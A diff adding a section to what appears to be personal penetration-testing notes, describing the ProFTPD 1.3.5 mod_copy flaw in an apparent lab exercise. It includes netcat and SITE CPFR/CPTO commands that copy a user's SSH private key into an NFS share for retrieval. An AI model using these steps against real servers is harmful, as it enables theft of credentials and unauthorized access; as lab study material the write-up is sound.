@@ -205,7 +205,32 @@ LIST # view user imbox.
 RETR 1 # view each mail with id, 1 or 2 or 3 etc...
 ```
 
+### proftpd 1.3.5 exploit
 
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+# the proftpd 1.3.5 is vulnerable to some file copy exploit.
+# when we do a "searchsploit proftpd 1.3.5" we get a "<mod_copy>" exploit.
+# The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.
+
+# assuming we have access to an NFS share ie, /var, we can copy files if we have enough privileges for example a user .ssh file. 
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (142).png" alt="" width="201"><figcaption><p>1</p></figcaption></figure>
+
+And given that we have access to an NFS share: ![](<.gitbook/assets/image (143).png>)
+
+We can copy this ssh key to the NFS share, mount it on our kali and access it, using the proftpd 1.3.5 vuln.
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+nc 10.10.70.109 21 # to connect to ftp.
+SITE CPFR /home/kenobi/.ssh/id_rsa # file to copy.
+SITE CPTO /var/tmp/id_rsa # copy to NFS /var share.
+# now, mount the share and access the ssh key.
+```
+{% endcode %}
 
 
 
